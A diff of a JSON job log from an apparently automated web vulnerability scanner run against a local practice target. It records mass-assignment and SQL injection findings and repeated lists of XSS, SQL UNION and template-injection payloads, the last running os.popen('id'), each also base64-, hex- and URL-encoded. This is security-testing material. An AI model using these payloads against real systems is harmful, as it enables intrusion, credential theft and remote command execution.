-          "description": "Accepted {'role': 'admin'} via POST",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'role': 'admin'} via PATCH",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root', 'admin']} via POST",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root', 'admin']} via PATCH",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'permissions': 'ALL'} via POST",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'permissions': 'ALL'} via PATCH",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root']} via POST",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root']} via PATCH",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781452471.9019907,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "31e50fa1-00d7-4487-885c-b826b219f88d",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'ip': '127.0.0.1', 'Submit': 'Submit', 'is_admin': True} via POST",
-          "evidence": "Payload {'ip': '127.0.0.1', 'Submit': 'Submit', 'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'ip': '127.0.0.1', 'Submit': 'Submit', 'groups': ['root', 'admin']} via POST",
-          "evidence": "Payload {'ip': '127.0.0.1', 'Submit': 'Submit', 'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'ip': '127.0.0.1', 'Submit': 'Submit', 'permissions': 'ALL'} via POST",
-          "evidence": "Payload {'ip': '127.0.0.1', 'Submit': 'Submit', 'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'ip': '127.0.0.1', 'Submit': 'Submit', 'permissions': 'ALL'} via PATCH",
-          "evidence": "Payload {'ip': '127.0.0.1', 'Submit': 'Submit', 'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'ip': '127.0.0.1', 'Submit': 'Submit', 'groups': ['root']} via PATCH",
-          "evidence": "Payload {'ip': '127.0.0.1', 'Submit': 'Submit', 'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781452472.3674133,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d8f6b848-f8ca-4093-b058-473a81461ff6",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'is_admin': True} via POST",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'is_admin': True} via PATCH",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'role': 'admin'} via POST",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'role': 'admin'} via PATCH",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root', 'admin']} via POST",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root', 'admin']} via PATCH",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'permissions': 'ALL'} via POST",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'permissions': 'ALL'} via PATCH",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root']} via POST",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root']} via PATCH",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781452472.9030786,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d3384eb7-2304-43bc-8f5a-e9c261007b97",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'is_admin': True} via POST",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'is_admin': True} via PATCH",
-          "evidence": "Payload {'is_admin': True}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'role': 'admin'} via POST",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'role': 'admin'} via PATCH",
-          "evidence": "Payload {'role': 'admin'}. logic signals=3 [positive_marker, no_denial_marker, payload_reflected]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root', 'admin']} via POST",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root', 'admin']} via PATCH",
-          "evidence": "Payload {'groups': ['root', 'admin']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'permissions': 'ALL'} via POST",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'permissions': 'ALL'} via PATCH",
-          "evidence": "Payload {'permissions': 'ALL'}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (POST)",
-          "severity": "HIGH",
-          "description": "Accepted {'groups': ['root']} via POST",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        },
-        {
-          "name": "Mass Assignment (PATCH)",
-          "severity": "CRITICAL",
-          "description": "Accepted {'groups': ['root']} via PATCH",
-          "evidence": "Payload {'groups': ['root']}. logic signals=2 [positive_marker, no_denial_marker]",
-          "remediation": "Use explicit DTOs and block arbitrary model bindings."
-        }
-      ]
-    }
-  },
-  {
-    "timestamp": 1781452472.9252489,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "a2aea5f7-a34d-4141-b73a-ae8e538ca13e",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452472.9458623,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "310b200f-f373-43b5-8a08-b50811ff3018",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452472.974127,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ad433afb-4599-4659-a000-d99de9cf73dc",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452472.9988756,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "5f1679c0-5aae-4d0f-9698-dfbc36c6a180",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.0232632,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "11d6bb20-86b8-4206-82fa-b749c07d4e12",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.0439649,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "8c166870-ef78-4fe0-8b78-b7e39b9dd31a",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.0655096,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "4fc5ca4a-2aec-4339-87ad-fc82d3d501d0",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.0866804,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b93f8f2a-9830-49de-bf27-a8cfd7659cfa",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.105401,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "cf4af586-a8de-435b-b60a-41fa586e33d2",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.132896,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "0af336cc-29aa-49cf-9a35-8d3eaa7b1a93",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.1541874,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "2303301a-5a5e-4254-a85f-a99b5cb0970e",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.1755118,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "b853b3a9-b143-466e-9bcf-4172fcf26060",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.1953897,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "712b9298-587d-4d79-a6d4-8a766ebc3868",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.2164733,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d70f18c6-0737-43ca-bd9c-3486477d59db",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.24698,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "d69734ed-f37a-42cd-8dcc-e97ebc67685c",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.2725897,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "a173b4a6-4073-4124-990e-87629eec721b",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.3374043,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "54ffc772-d9f0-484a-92df-47c89e2a519a",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.3580053,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "09356fa4-98a1-45b0-acf0-4f8367f0b4c7",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.384818,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "ff881d9d-074b-4910-8dea-1075fbc70ca5",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.4046466,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "7de0e077-9b2a-41f6-9646-32b06b0c561e",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452473.43319,
-    "scan_id": "GLOBAL",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "13293299-982e-46ac-a916-b98540d6f68a",
-      "status": "SUCCESS"
-    }
-  },
-  {
-    "timestamp": 1781452484.2130425,
-    "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
-    "message": "Background job completed",
-    "payload": {
-      "job_id": "40d9e562-1823-4118-82f6-640b47c4bded",
-      "status": "VULN_FOUND",
-      "vulnerabilities": [
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli/?id=1admin%27+%23&Submit=Submit\nDB-error signature: True; differential signals=3 confidence=70% (status 200->200, len 807->5241)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit%27+OR+1%3D1--\nDB-error signature: True; differential signals=3 confidence=70% (status 200->200, len 807->5235)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submitadmin%27+%23\nDB-error signature: True; differential signals=3 confidence=70% (status 200->200, len 807->5233)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        },
-        {
-          "name": "SQL Injection",
-          "severity": "CRITICAL",
-          "description": "Injection caused a material, repeatable response divergence.",
-          "evidence": "Target: http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit%27+UNION+SELECT+1%2C2%2C3--\nDB-error signature: True; differential signals=3 confidence=70% (status 200->200, len 807->5245)",
-          "remediation": "Use parameterized queries (Prepared Statements)."
-        }
-      ]
-    }
-  },
-  {
     "timestamp": 1781452494.725187,
     "scan_id": "df77320b-b532-4590-ad23-db3ea6012309",
     "message": "Background job completed",
@@ -8612,6 +6899,1224 @@
     "message": "Background job completed",
     "payload": {
       "job_id": "cd36702d-3643-43f1-9546-cdfd981e67f5",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781974341.8165524,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d566ca10-c1bb-4530-ad59-95e30260be79",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781974341.9787483,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "abaee528-546b-46a6-9e15-d048131fd756",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974342.2532156,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9448149a-e0a6-46e8-87c5-a25b92897049",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781974342.433348,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "2a6cafef-481f-4e5e-9b31-ab8f145c5bdd",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781974344.1913555,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d7c0ef63-890a-4e6e-b13d-e791fbeec14d",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781974344.5014074,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "824dc164-7881-495e-89ba-c3be687b8878",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781974344.740888,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "22cb27dd-7bb6-4111-9253-593f07c81a8d",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974345.1713467,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "b752f6fd-5d3f-4ce8-aba2-e6d7b0d9c3e3",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974345.4043763,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "c329d468-3a72-4c7c-b1a5-ca68927ef911",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974359.8705034,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "f380b8e7-198e-4aa1-be58-5b9bbd3b289d",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974363.5952542,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "2c7cee9e-c16f-4acd-920d-eb139589eecf",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781974363.8950431,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "e869581e-4384-4578-9709-bb85192e1316",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781974364.2948322,
+    "scan_id": "HIVE-V5-5002972364",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ac6ec7ac-c666-455d-8f7e-7d317ac0132c",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781975410.5522275,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "4db7ff92-9edf-40b0-84d9-f59db2a4a8d1",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781975413.6788206,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "7b950925-b30d-482e-8e63-b4d5414f29b9",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975425.3017385,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "67c9357d-fb79-40ed-b6d1-e04b73baff47",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781975428.7322168,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "5aed8709-b1bc-4fb3-a2cf-c3f54f67ec67",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
